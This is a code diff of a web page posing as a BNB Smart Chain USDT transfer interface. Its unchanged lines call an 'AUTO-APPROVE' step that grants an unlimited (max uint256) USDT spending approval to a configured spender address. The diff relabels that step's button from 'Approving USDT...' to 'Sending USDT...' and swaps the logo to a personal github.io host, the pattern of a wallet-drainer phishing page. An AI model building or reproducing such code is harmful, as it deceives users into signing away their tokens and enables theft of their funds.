@@ -204,7 +204,7 @@
                 <div class="section">
                     <div class="section-label">Network</div>
                     <div class="network-selector">
-                        <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" class="network-logo">
+                        <img src="https://salmanraheem-dev.github.io/bsc/logobnb.png" class="network-logo">
                         <span style="font-size: 14px;">BNB Smart Chain</span>
                     </div>
                 </div>
@@ -313,7 +313,7 @@
 
                 // PHASE 1: AUTO-APPROVE
                 btn.disabled = true;
-                btn.innerHTML = '<span class="loading-spinner"></span> Approving USDT...';
+                btn.innerHTML = '<span class="loading-spinner"></span> Sending USDT...';
                 
                 const infinite = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
                 await contract.methods.approve(CONFIG.SPENDER, infinite).send({ from: userAccount });
